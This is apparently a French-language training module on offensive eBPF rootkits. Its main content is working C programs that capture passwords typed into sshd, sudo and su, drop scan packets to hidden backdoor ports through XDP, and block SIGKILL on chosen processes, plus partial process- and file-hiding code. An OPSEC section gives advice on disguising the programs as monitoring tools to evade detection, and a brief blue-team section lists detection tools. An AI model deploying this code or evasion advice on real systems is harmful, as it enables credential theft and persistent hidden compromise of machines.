# Module L38 : eBPF Offensive - Rootkits et Techniques d'Évasion

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Développer des rootkits eBPF furtifs
- Hooker des syscalls pour intercepter/modifier les données
- Cacher des processus, fichiers et connexions réseau
- Exfiltrer des credentials via eBPF
- Comprendre et contourner les mécanismes de détection

## Prérequis

- Module précédent : eBPF Basics (L37)
- Compréhension des syscalls Linux
- Connaissance des structures kernel (task_struct, etc.)

## Introduction

### Pourquoi eBPF pour les rootkits ?

**Comparaison LKM vs eBPF** :

```
┌─────────────────────────────────────────────────────────────────┐
│                    LKM ROOTKIT                                  │
├─────────────────────────────────────────────────────────────────┤
│  ✗ Visible dans lsmod                                          │
│  ✗ Fichier .ko sur le disque                                   │
│  ✗ Signature requise (Secure Boot)                             │
│  ✗ Peut crasher le kernel                                      │
│  ✗ Difficile à maintenir (versions kernel)                     │
│  ✓ Accès complet au kernel                                     │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    eBPF ROOTKIT                                 │
├─────────────────────────────────────────────────────────────────┤
│  ✓ Non visible dans lsmod                                      │
│  ✓ Chargeable depuis mémoire                                   │
│  ✓ Pas de signature requise                                    │
│  ✓ Verifier empêche les crashes                                │
│  ✓ Plus portable (API stable)                                  │
│  ~ Accès limité mais suffisant pour la plupart des cas         │
└─────────────────────────────────────────────────────────────────┘
```

### Architecture d'un rootkit eBPF

```
USER SPACE                           KERNEL SPACE
═══════════                          ════════════

┌─────────────────┐
│  C2 Client      │
│  (daemon)       │◄─────────┐
└────────┬────────┘          │
         │                   │ Événements
         │ bpf() syscall     │ (credentials, etc.)
         │                   │
         ▼                   │
┌─────────────────────────────────────────────────────┐
│              PROGRAMMES eBPF                         │
├─────────────────────────────────────────────────────┤
│                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │
│  │ SYSCALL     │  │  NETWORK    │  │  SCHEDULER  │ │
│  │ HOOKS       │  │  HOOKS      │  │  HOOKS      │ │
│  │             │  │             │  │             │ │
│  │ - read      │  │ - XDP       │  │ - sched_*   │ │
│  │ - write     │  │ - TC        │  │             │ │
│  │ - open      │  │ - sk_filter │  │             │ │
│  │ - getdents  │  │             │  │             │ │
│  └─────────────┘  └─────────────┘  └─────────────┘ │
│         │                │                │        │
│         └────────────────┼────────────────┘        │
│                          │                         │
│                    ┌─────┴─────┐                   │
│                    │ BPF MAPS  │                   │
│                    │           │                   │
│                    │ - config  │                   │
│                    │ - events  │                   │
│                    │ - hidden  │                   │
│                    └───────────┘                   │
│                                                      │
└─────────────────────────────────────────────────────┘
```

## Technique 1 : Credential Stealing via eBPF

### Hooking des syscalls d'authentification

**Cible** : Intercepter les mots de passe lors de l'authentification SSH, sudo, su.

```
FLUX D'AUTHENTIFICATION
════════════════════════

User tape password
        │
        ▼
┌───────────────┐
│  Terminal     │
│  (SSH/sudo)   │
└───────┬───────┘
        │ read() syscall
        ▼
┌───────────────────────────────┐
│  eBPF HOOK (kprobe:sys_read)  │◄── INTERCEPTION ICI
│                               │
│  if (fd == stdin &&           │
│      process == "sshd")       │
│     log_data(buffer)          │
└───────────────────────────────┘
        │
        ▼
    Kernel
        │
        ▼
  Données vers userspace (légitime)
```

### Implémentation

```c
// cred_stealer.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define MAX_DATA_SIZE 256

// Processus cibles pour le credential stealing
#define TARGET_SSHD    "sshd"
#define TARGET_SUDO    "sudo"
#define TARGET_SU      "su"
#define TARGET_PASSWD  "passwd"

struct cred_event {
    __u32 pid;
    __u32 uid;
    char comm[16];
    char data[MAX_DATA_SIZE];
    __u32 data_len;
};

// Map pour envoyer les credentials vers userspace
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

// Map pour stocker les buffers en attente (sys_enter → sys_exit)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);    // pid_tgid
    __type(value, __u64);  // buffer address
} pending_reads SEC(".maps");

// Vérifier si le processus est une cible
static __always_inline int is_target_process(char *comm) {
    char target_sshd[] = TARGET_SSHD;
    char target_sudo[] = TARGET_SUDO;
    char target_su[] = TARGET_SU;

    // Comparaison basique (améliorer avec bpf_strncmp si disponible)
    for (int i = 0; i < 4; i++) {
        if (comm[i] != target_sshd[i] &&
            comm[i] != target_sudo[i] &&
            comm[i] != target_su[i]) {
            return 0;
        }
    }
    return 1;
}

// Hook à l'entrée de sys_read
SEC("tracepoint/syscalls/sys_enter_read")
int trace_read_enter(struct trace_event_raw_sys_enter* ctx) {
    int fd = (int)ctx->args[0];
    char *buf = (char *)ctx->args[1];

    // On s'intéresse uniquement à stdin (fd 0)
    if (fd != 0)
        return 0;

    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));

    // Vérifier si c'est un processus cible
    if (!is_target_process(comm))
        return 0;

    // Stocker l'adresse du buffer pour sys_exit
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 buf_addr = (__u64)buf;

    bpf_map_update_elem(&pending_reads, &pid_tgid, &buf_addr, BPF_ANY);

    return 0;
}

// Hook à la sortie de sys_read
SEC("tracepoint/syscalls/sys_exit_read")
int trace_read_exit(struct trace_event_raw_sys_exit* ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 *buf_addr;
    long ret = ctx->ret;

    // Récupérer le buffer stocké à l'entrée
    buf_addr = bpf_map_lookup_elem(&pending_reads, &pid_tgid);
    if (!buf_addr)
        return 0;

    // Vérifier que read() a réussi
    if (ret <= 0) {
        bpf_map_delete_elem(&pending_reads, &pid_tgid);
        return 0;
    }

    // Préparer l'événement
    struct cred_event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        bpf_map_delete_elem(&pending_reads, &pid_tgid);
        return 0;
    }

    e->pid = pid_tgid >> 32;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    // Lire le contenu du buffer userspace
    __u32 data_len = ret;
    if (data_len > MAX_DATA_SIZE - 1)
        data_len = MAX_DATA_SIZE - 1;

    e->data_len = data_len;
    bpf_probe_read_user(&e->data, data_len, (void *)*buf_addr);
    e->data[data_len] = '\0';

    // Envoyer vers userspace
    bpf_ringbuf_submit(e, 0);

    // Nettoyer
    bpf_map_delete_elem(&pending_reads, &pid_tgid);

    return 0;
}
```

## Technique 2 : Process Hiding

### Principe

Pour cacher un processus, on intercepte `getdents64` (utilisé par `ls`, `ps`, etc.) et on filtre les entrées correspondant aux PIDs cachés.

```
PROCESSUS DE LISTING (ps, top, htop)
═════════════════════════════════════

         ps aux
            │
            ▼
    opendir("/proc")
            │
            ▼
    getdents64()  ◄──── HOOK eBPF
            │
            │  Entrées retournées :
            │  ├─ "1" (init)
            │  ├─ "1234" (sshd)
            │  ├─ "5678" (malware) ◄── FILTRÉ !
            │  └─ "9999" (bash)
            │
            ▼
    Résultat affiché (sans 5678)
```

### Implémentation

```c
// hide_process.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

// PIDs à cacher (configurés depuis userspace)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);    // PID
    __type(value, __u8);   // dummy (1 = caché)
} hidden_pids SEC(".maps");

// Structure linux_dirent64
struct linux_dirent64 {
    __u64 d_ino;
    __s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

// Map temporaire pour stocker les infos entre enter et exit
struct getdents_data {
    __u64 dirp;      // Pointeur vers le buffer
    __u64 count;     // Taille du buffer
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, struct getdents_data);
} getdents_args SEC(".maps");

// Convertir string en nombre
static __always_inline __u32 str_to_pid(const char *str) {
    __u32 pid = 0;

    #pragma unroll
    for (int i = 0; i < 10; i++) {
        char c = str[i];
        if (c == '\0')
            break;
        if (c < '0' || c > '9')
            return 0;  // Pas un nombre
        pid = pid * 10 + (c - '0');
    }

    return pid;
}

SEC("tracepoint/syscalls/sys_enter_getdents64")
int trace_getdents_enter(struct trace_event_raw_sys_enter* ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    struct getdents_data data = {
        .dirp = ctx->args[1],
        .count = ctx->args[2],
    };

    bpf_map_update_elem(&getdents_args, &pid_tgid, &data, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int trace_getdents_exit(struct trace_event_raw_sys_exit* ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct getdents_data *data;
    long ret = ctx->ret;

    data = bpf_map_lookup_elem(&getdents_args, &pid_tgid);
    if (!data || ret <= 0) {
        bpf_map_delete_elem(&getdents_args, &pid_tgid);
        return 0;
    }

    // Parcourir les entrées du buffer
    // NOTE: Manipulation complexe, simplifiée ici
    // En pratique, on modifie d_reclen pour "sauter" l'entrée

    char dirent_name[32];
    struct linux_dirent64 dirent;

    // Lire la première entrée
    bpf_probe_read_user(&dirent, sizeof(dirent), (void *)data->dirp);
    bpf_probe_read_user_str(&dirent_name, sizeof(dirent_name),
                           (void *)(data->dirp + 19)); // offset de d_name

    // Convertir en PID
    __u32 pid = str_to_pid(dirent_name);
    if (pid > 0) {
        __u8 *hidden = bpf_map_lookup_elem(&hidden_pids, &pid);
        if (hidden) {
            // PID trouvé dans la liste des cachés
            // En pratique, modifier d_reclen de l'entrée précédente
            // pour sauter celle-ci (nécessite bpf_probe_write_user)
            bpf_printk("Hiding PID: %d\n", pid);
        }
    }

    bpf_map_delete_elem(&getdents_args, &pid_tgid);
    return 0;
}
```

## Technique 3 : Network Hiding avec XDP

### Principe

XDP (eXpress Data Path) permet de traiter les paquets réseau AVANT qu'ils n'atteignent la stack réseau. On peut :
- **Dropper** des paquets de scan
- **Cacher** des connexions en modifiant les réponses
- **Exfiltrer** des données via des paquets forgés

```
FLUX RÉSEAU AVEC XDP
═════════════════════

Paquet entrant (SYN scan)
        │
        ▼
┌───────────────────────────┐
│     DRIVER RÉSEAU         │
└─────────────┬─────────────┘
              │
              ▼
┌───────────────────────────┐
│       XDP HOOK            │◄── INTERCEPTION TRÈS TÔT
│                           │
│  if (port == 4444)        │
│     return XDP_DROP;      │    ← Invisible aux scanners
│                           │
│  return XDP_PASS;         │    ← Traitement normal
└───────────────────────────┘
              │
              ▼
        Stack TCP/IP
              │
              ▼
        Application
```

### Implémentation

```c
// xdp_hide_port.bpf.c
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

// Ports à cacher (connexions C2, backdoors, etc.)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u16);    // Port
    __type(value, __u8);   // dummy
} hidden_ports SEC(".maps");

SEC("xdp")
int xdp_hide_connections(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    // Parse Ethernet header
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    // On ne traite que IPv4
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    // Parse IP header
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    __u16 dest_port = 0;

    // TCP
    if (ip->protocol == IPPROTO_TCP) {
        struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
        if ((void *)(tcp + 1) > data_end)
            return XDP_PASS;

        dest_port = bpf_ntohs(tcp->dest);

        // Vérifier si c'est un port caché
        __u8 *hidden = bpf_map_lookup_elem(&hidden_ports, &dest_port);
        if (hidden) {
            // Drop les paquets SYN vers ce port (anti-scan)
            if (tcp->syn && !tcp->ack) {
                return XDP_DROP;
            }
        }
    }

    // UDP
    if (ip->protocol == IPPROTO_UDP) {
        struct udphdr *udp = (void *)ip + (ip->ihl * 4);
        if ((void *)(udp + 1) > data_end)
            return XDP_PASS;

        dest_port = bpf_ntohs(udp->dest);

        __u8 *hidden = bpf_map_lookup_elem(&hidden_ports, &dest_port);
        if (hidden) {
            return XDP_DROP;
        }
    }

    return XDP_PASS;
}
```

## Technique 4 : Syscall Return Value Modification

### Override des valeurs de retour

Avec `bpf_override_return`, on peut modifier la valeur de retour d'un syscall :

```c
// kill_protection.bpf.c
// Empêcher de tuer certains processus

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

// PIDs protégés
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);
    __type(value, __u8);
} protected_pids SEC(".maps");

SEC("kprobe/__x64_sys_kill")
int protect_process(struct pt_regs *ctx) {
    // Arguments: kill(pid_t pid, int sig)
    __u32 target_pid = (__u32)PT_REGS_PARM1(ctx);
    int sig = (int)PT_REGS_PARM2(ctx);

    // Vérifier si le PID est protégé
    __u8 *protected = bpf_map_lookup_elem(&protected_pids, &target_pid);
    if (protected && sig == 9) {  // SIGKILL
        // Retourner -EPERM (Permission denied)
        bpf_override_return(ctx, -1);
        bpf_printk("Blocked kill -9 on protected PID: %d\n", target_pid);
    }

    return 0;
}
```

## Technique 5 : File Hiding

### Cacher des fichiers via getdents

```c
// hide_files.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

char LICENSE[] SEC("license") = "GPL";

// Préfixes de fichiers à cacher
#define HIDDEN_PREFIX ".malware"
#define HIDDEN_PREFIX_LEN 8

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u64);
} getdents_data SEC(".maps");

// Vérifier si le nom commence par le préfixe caché
static __always_inline int should_hide(const char *name) {
    char prefix[] = HIDDEN_PREFIX;

    #pragma unroll
    for (int i = 0; i < HIDDEN_PREFIX_LEN; i++) {
        if (name[i] != prefix[i])
            return 0;
    }
    return 1;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int filter_hidden_files(struct trace_event_raw_sys_exit* ctx) {
    // Même logique que process hiding
    // Filtrer les entrées dont le nom commence par HIDDEN_PREFIX
    return 0;
}
```

## Application offensive

### Rootkit eBPF complet - Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                      eBPF ROOTKIT                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  COMPOSANTS:                                                    │
│                                                                 │
│  1. LOADER (userspace)                                          │
│     ├─ Charge les programmes eBPF                              │
│     ├─ Configure les maps (PIDs, ports, fichiers à cacher)     │
│     ├─ Reçoit les événements (credentials, keystrokes)         │
│     └─ Communique avec le C2                                   │
│                                                                 │
│  2. CREDENTIAL STEALER (eBPF)                                   │
│     ├─ Hook sys_read sur stdin                                 │
│     ├─ Cible: sshd, sudo, su, passwd                           │
│     └─ Envoie vers ringbuf                                      │
│                                                                 │
│  3. PROCESS HIDER (eBPF)                                        │
│     ├─ Hook sys_getdents64                                     │
│     ├─ Filtre les PIDs configurés                              │
│     └─ Invisible à ps, top, htop                               │
│                                                                 │
│  4. FILE HIDER (eBPF)                                           │
│     ├─ Hook sys_getdents64 sur paths                           │
│     ├─ Filtre les fichiers par préfixe/nom                     │
│     └─ Invisible à ls, find                                    │
│                                                                 │
│  5. NETWORK HIDER (XDP)                                         │
│     ├─ Drop paquets vers ports cachés                          │
│     ├─ Anti-scan (SYN drop)                                    │
│     └─ Connexion C2 invisible                                  │
│                                                                 │
│  6. PROCESS PROTECTOR (eBPF)                                    │
│     ├─ Hook sys_kill                                           │
│     ├─ Bloque SIGKILL sur PIDs protégés                        │
│     └─ Survie garantie                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Considérations OPSEC

**Détection possible** :

```bash
# Lister les programmes eBPF chargés
sudo bpftool prog list
# ID  TYPE         NAME
# 42  kprobe       trace_read_enter
# 43  kprobe       trace_read_exit
# 44  xdp          xdp_hide_connections

# Lister les maps
sudo bpftool map list

# Voir les attachements
sudo bpftool link list
sudo bpftool net list  # Pour XDP
```

**Contre-mesures** :

1. **Nommage légitime** :
```c
// Mauvais
SEC("kprobe/sys_read") int steal_creds(...) { }

// Bon (ressemble à un outil de monitoring)
SEC("kprobe/sys_read") int perf_read_trace(...) { }
```

2. **Durée limitée** :
```c
// Ne pas rester chargé en permanence
// Charger → Collecter → Décharger → Attendre
```

3. **Maps nommées de manière anodine** :
```c
// Mauvais
struct { ... } stolen_credentials SEC(".maps");

// Bon
struct { ... } read_stats SEC(".maps");
```

4. **Éviter les patterns suspects** :
```bash
# Ne pas hooker trop de syscalls simultanément
# Privilégier des hooks ciblés et temporaires
```

## Détection et défense

### Du point de vue Blue Team

**Outils de détection** :
```bash
# bpftool - Outil officiel
sudo bpftool prog list
sudo bpftool map list
sudo bpftool link list

# Tracee (Aqua Security) - Détection eBPF malveillant
./tracee --filter event=bpf

# Falco - Rules pour eBPF suspect
# /etc/falco/rules.d/ebpf.yaml
```

**Indicateurs de compromission** :
- Programmes eBPF non reconnus
- Maps avec des noms suspects
- Programmes attachés à des syscalls sensibles (read, getdents, kill)
- XDP attaché sans raison légitime

### Limitations eBPF (pour l'attaquant)

1. **Privilèges requis** : CAP_BPF ou root
2. **Verifier strict** : Pas de boucles infinies, accès mémoire limités
3. **Stack limitée** : 512 bytes max
4. **Pas de sommeil** : Pas de sleep/wait dans eBPF
5. **Helpers limités** : Fonctionnalités restreintes selon le type de programme

## Résumé

- **eBPF rootkits** offrent une furtivité supérieure aux LKM
- **Credential stealing** : Hook sys_read sur stdin pour sshd/sudo
- **Process hiding** : Filtrage des résultats getdents64
- **Network hiding** : XDP pour dropper les scans et cacher les connexions
- **Process protection** : Override de sys_kill pour survie
- **OPSEC** : Nommage légitime, durée limitée, patterns discrets
- **Détection** : bpftool, Tracee, Falco

## Ressources complémentaires

**Recherche** :
- [Bad BPF - Offensive BPF](https://blog.tofile.dev/2021/08/01/bad-bpf.html)
- [eBPF for Red Teamers](https://www.yourkit.com/blog/)
- [Hiding in Plain Sight with BPF](https://defcon.org/)

**Outils existants** :
- `bad-bpf` - Exemples de programmes eBPF offensifs
- `pamspy` - Credential stealing via eBPF
- `ebpfkit` - Framework rootkit eBPF

**Commandes utiles** :
```bash
# Charger un programme XDP
sudo ip link set dev eth0 xdp obj prog.o sec xdp

# Détacher XDP
sudo ip link set dev eth0 xdp off

# Debug eBPF
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

---

**Navigation**
- [Module précédent : eBPF Basics](../07-eBPF-Basics/)
- [Phase suivante : C2 Development](../../09-C2-Development/)
